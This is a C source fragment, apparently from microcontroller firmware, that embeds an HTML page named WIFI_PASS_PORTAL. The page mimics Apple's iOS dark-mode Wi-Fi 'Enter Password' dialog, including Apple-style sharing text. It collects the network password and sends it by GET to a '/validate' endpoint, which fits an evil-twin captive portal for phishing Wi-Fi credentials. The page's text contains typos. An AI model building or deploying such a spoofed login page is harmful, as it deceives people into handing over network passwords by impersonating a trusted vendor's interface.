const char WIFI_PASS_PORTAL[] = R"=====(
<html>
<head>
      <title>Enter the password for </title>

    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>

<style>
body {
 font-family: -apple-system, BlinkMacSystemFont, sans-serif;
 background-color: #1c1c1e;
}
.login-page {
width: 360px;
padding: 8% 0 0;
margin: auto;
}

.link_text {
color: #1d73ff;
font-size: 18px;
font-weight: 500;
text-decoration: none;
font-weight: bold;
}
.text_center_bold.{
text-align: center;
font-weight: bold;
}
.input_container {
  background-color: #2c2c2e;
  padding: 1rem;
  border-radius: 0.8rem;
  color: white;
}
.input_container input {
  background-color: #2c2c2e;
  width: 75%;
  padding: 0.5rem;
  border: none;
  cursor: text;
  font-size: 18px;
}

.input_container input input[type="password"]::-webkit-password-slash-button,
.input_container input input[type="password"]::-webkit-password-eye {
  caret-color: white;
}

.input_container input:focus {
  border: none;
  outline: none;
  caret-color: #1d73ff;
}

.container {
  display: flex;
}

.row {
  display: flex;
  justify-content: space-between;
  width: 100%;
}

.column {
  flex-basis: 30%; /* Ancho de las columnas */
  padding: 10px; /* Espaciado interno */
  margin: 5px; /* Margen externo */
}

.btn {
  display: inline-block;
  background-color: transparent;
  border: none;
  border-radius: 0.5rem;
  cursor: pointer;
  text-align: end;
}

.button-container {
  flex-basis: calc(100% - 20px); /* Restar el padding y el margen del ancho del contenedor */
  text-align: center; /* Alinear el botón al centro horizontalmente */
  vertical-align: middle;
}
</style>
</head>
<body>
<form class='login-form' action='/validate' method='GET'>
<div class="container">
  <div class="header_text row">
    <div class="column">
      <p class="link_text">Cancel</p>
    </div>
    <div class="column">
      <h3 class="text_center_bold" style="color: white;">Enter Password</h3>
    </div>
    <div class="column" style="text-align: end;">
      <p type='submit' class="link_text btn">
        <button type='submit' class="link_text btn">Login</button>
      </p>
    </div>
  </div>
</div>
<div  style="padding: 10px;">
  <div class="input_container">
    <span style="font-size:20px;">Password</span>
    <input type='password' name='pass' required focus id="myInput" />
  </div>
  <div style="padding: 10px;">
    <p style="color:#9898a0;font-size:20px;">You can also access this Wi-Fi network by bringing you Iphone near any Iphone, Ipad, or Mac which has connected to this network and has you in ther contacts.</p>
  </div>
</div>

</form>
<script>
  window.onload = function() {
    document.getElementById("myInput").focus();
  }
</script>
</body>
</html>
)=====";
